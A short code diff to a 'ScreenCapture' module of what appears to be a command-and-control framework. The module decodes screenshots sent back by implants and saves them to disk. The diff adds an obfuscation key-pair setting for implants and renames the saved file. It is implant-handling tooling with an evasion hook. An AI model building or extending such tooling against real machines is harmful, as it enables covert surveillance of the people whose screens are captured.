@@ -7,11 +7,15 @@ class ScreenCapture:
     type = "SC"
     args = "base64 target file"
     input = "screenshot"
+    # this must be unique across ALL implants, any matching keys will be merged causing errors.
+    # To safely format this use the following format "<type>_variablename":"value" i.e.
+    #   fd_base64_var: base64filecontents
+    obfuscation_keypairs = {}
 
     def process_implant_response(self, data, args):
 
         filename = secrets.token_hex(4)
-        download_file_path = f"{Settings.file_download_folder}downloaded_file_{filename}.png"
+        download_file_path = f"{Settings.file_download_folder}screenshot_file_{filename}.png"
         with open(download_file_path, 'wb') as file_h:
 
             file_h.write(base64.b64decode(data))
